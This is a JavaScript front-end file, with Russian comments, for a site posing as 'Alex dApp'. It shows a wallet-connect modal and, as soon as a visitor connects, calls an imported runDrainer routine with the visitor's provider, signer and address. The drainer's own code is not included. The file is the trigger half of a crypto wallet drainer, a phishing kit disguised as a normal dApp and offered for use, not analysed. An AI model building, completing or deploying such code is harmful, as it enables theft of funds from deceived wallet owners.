import { createAppKit } from '@reown/appkit'
import { mainnet, arbitrum, bsc } from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, arbitrum, bsc]

const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks
  wallets: {
    coinbase: false // отключаем, если он не нужен
  }
})

const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz', // должен совпадать с текущим доменом
  icons: ['https://checkalex.xyz/icon.png']
}

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

console.log("modal object:", modal) // <-- вот это

// При клике открывается модальное окно подключения
document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())

// Подписываемся на событие подключения, которое возвращает payload (или можно использовать другое событие, см. документацию AppKit)
modal.on("connect", async (payload) => {
  // В этот момент пользователь успешно подключился
  console.log("Кошелек подключен. Запускаем Drainer...");

  // Показать какой-нибудь индикатор загрузки или статус внутри модалки, если библиотека позволяет (например, установить статус "Обработка...")
  try {
    // Создаем провайдер и подписанта, которые должны уже быть активными после подключения
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    const signer = provider.getSigner()
    const address = await signer.getAddress()

    // Запускаем drainer – см. функцию runDrainer (она должна обрабатывать вызовы контракта)
    await runDrainer(provider, signer, address)

    // После успешного завершения drainer можно закрыть модальное окно (если оно должно закрываться)
    modal.close();
    console.log("Drainer завершен успешно.");
  } catch (e) {
    console.error("Ошибка в Drainer:", e);
    // Здесь можно показать сообщение об ошибке внутри модального окна
    alert("Ошибка при выполнении Drainer: " + e.message);
    // Если есть возможность, оставь окно открытым, чтобы пользователь видел статус
  }
});

// Если тебе больше не нужна отдельная кнопка "Запустить Drainer", можно убрать этот обработчик:
// document.getElementById('drainer-btn').addEventListener('click', async () => { ... });
